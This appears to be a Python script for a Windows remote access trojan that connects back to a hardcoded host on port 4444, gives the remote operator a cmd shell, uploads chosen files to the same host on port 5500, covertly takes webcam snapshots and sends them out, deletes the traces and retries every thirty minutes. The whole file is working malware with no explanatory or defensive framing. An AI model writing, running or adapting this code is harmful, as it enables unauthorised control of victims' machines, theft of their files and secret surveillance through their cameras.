import asyncio
import socket
import cv2
from sys import *
import os
import time
'''
parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
                                 description="Jai_Sunnyleone")

parser.add_argument('--host', action='store', dest='host',
                    required=True, help='Host listening for reverse connection')
parser.add_argument('--port', action='store', type=int,
                    dest='port', required=True, help='Port')

arguments = parser.parse_args()
'''

async def shell():
    snap=0
    while 1:
        proc = await asyncio.create_subprocess_shell("cmd",
                                                     stdin=asyncio.subprocess.PIPE,
                                                     stdout=asyncio.subprocess.PIPE,
                                                     stderr=asyncio.subprocess.STDOUT)
        cmd = b"\n"
        proc.stdin.write(cmd)
     
        while 1:
            while 1:
                out = await proc.stdout.readline()
                break_ = out.decode("latin-1")
                if break_[-2:] == ">\n" or break_[-3:] == "> \n":
                    s.send(out[:-1])
                    break
                elif break_.endswith(">" + cmd.decode()) or break_.endswith("> " + cmd.decode()):
                    pass
                else:
                    s.send(out)
                    
            
            cmd = s.recv(1024)
            cmd_ = cmd.decode()
            if cmd_ == "\n":
                proc.stdin.write(b"\n")
            elif cmd_.startswith("exit"):
                proc.terminate()
                break
            elif cmd_.startswith("down"):
                fil = cmd_.split(" ")
                fi = " ".join(fil[1:])
                fi = fi.rstrip()
                phost = HOST
                pport = 5500
                path = out.decode()
                path = path.rstrip()

                fpath = path[:-1]+'\\'

                d = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                d.connect((phost, pport))
                f_name = fi
                fi = fpath+f_name
                d.send(f_name.encode('utf-8'))
                time.sleep(1)
                file = open(fi, 'rb')
                data = file.read(99999999)
                d.send(data)
                proc.stdin.write(b"\n")
            elif cmd_.startswith("webcam_sn"):
                snap+= 1
                fl = "cam"+str(snap)+".jpg"
                fo="cam"+str(snap-1)+".jpg"
                video = cv2.VideoCapture(0)
                check, frame = video.read()
                cv2.imwrite(filename=fl, img=frame)
                video.release()
                phost = HOST
                pport = 5500
                d = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                d.connect((phost, pport))
                d.send(fl.encode('utf-8'))
                file = open(fl, 'rb')
                data = file.read(99999999)
                d.send(data)
                
                de="del"+" "+fo
          
                os.system(de) 
                proc.stdin.write(b"\n")
               

            else:
                proc.stdin.write(cmd + b"\n")
             


HOST = "192.168.155.123"
PORT = 4444
while True:
    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
            asyncio.run(shell())
        except:
            time.sleep(30*60)
            continue
            
            

             
      


